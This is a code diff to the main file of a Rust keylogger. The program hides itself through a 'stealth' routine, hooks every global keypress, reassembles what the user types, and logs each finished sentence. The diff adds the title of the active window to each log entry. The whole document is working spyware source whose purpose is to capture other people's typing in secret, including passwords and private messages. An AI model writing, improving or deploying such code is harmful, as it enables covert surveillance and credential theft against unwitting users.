@@ -1,5 +1,9 @@
 use rdev::{EventType::*, Key::*};
-use serde_json::json;
+use crate::modules::logging::LogText;
+
+#[cfg(feature = "window_titles")]
+use crate::modules::window::title::get_window_name;
+
 mod modules;
 
 // TODO: Ignore certain applications e.g. games - will be configurable
@@ -13,6 +17,8 @@ fn stealth() {
 
 fn main() {
     stealth();
+
+    let _ = crate::modules::logging::init_logger();
     // keep tack of cursor position using left and right arrow keys
     let mut cursor_pos = 0;
     // hold current word like this ["apple"]
@@ -21,14 +27,8 @@ fn main() {
     let mut words: Vec<String> = Vec::new();
 
     rdev::listen(move |event| {
-        let key = match event.event_type {
-            KeyPress(key) => Some(key),
-            _ => None,
-        };
-        //Get the keybuffer as a string, quite a misleading name
         let sentence = key_buffer.iter().map(|s| &*s.trim()).collect::<String>();
-
-        if let Some(key) = key {
+        if let KeyPress(key) = event.event_type {
             match key {
                 Space => {
                     cursor_pos = 0;
@@ -37,7 +37,7 @@ fn main() {
                     sentence.split_whitespace().for_each(|s| {
                         words.push(s.to_string());
                     });
-                    key_buffer.clear();
+                    key_buffer.clear(); 
                 }
                 LeftArrow => {
                     if cursor_pos >= 1 {
@@ -82,14 +82,9 @@ fn main() {
                     key_buffer.clear();
                     cursor_pos = 0;
                     if sentence_from_words.trim() != "" {
-                        let log = json!({
-                            // does nothing but was intended to identify different computers from each other
-                            "rid": "0001",
-                            "text": sentence_from_words,
-                            // you can fetch window_titles if you can use winapi right now
-                            // maybe I'll find a way to do this on linux and just use conditionals
-                        });
-                        println!("{}", log);
+                        let title = get_window_name();
+                        let lt = LogText::new(sentence_from_words, title);
+                        log::trace!(target: "Return", "{text}", text=log::as_serde!(lt));
                     }
                 }
                 _ => {
